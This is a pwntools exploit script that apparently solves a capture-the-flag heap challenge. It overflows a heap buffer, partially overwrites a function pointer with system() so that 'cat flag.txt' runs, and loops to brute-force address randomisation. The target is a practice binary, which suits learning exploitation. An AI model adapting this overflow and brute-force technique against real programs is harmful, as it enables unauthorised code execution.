from pwn import *
context.clear(arch='amd64', log_level='critical')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
exploit_str = b''
exploit_str += b'cat flag.txt\n' #System command when fp is overwritten
exploit_str += b'h'*35 #padding
exploit_str += b'ba8cba8c'#Contents of flag.txt leaked
exploit_str += b'\x20\x14\xa3' #Final 3 bytes of System addr
i=1
notCaught = True
while notCaught:
    print("\n")
    print(i)
    print("\n")
    p = process(['./heap0-64', exploit_str], cwd='/problems/heap0r-64_0_f0a8ba256dbd3e758d284ff90c05688b')
    try:
        done = p.recvlineS()
        if(done[0:4] == 'ba8c'):
            notCaught = False
            print("FOUND")
            print("FOUND")
            print("FOUND")
            print(done)
        else:
            p.kill()

    except EOFError:
        print("Failed")
        p.kill()
    except AttributeError:
        print("Failed")
        p.kill()
    i = i+1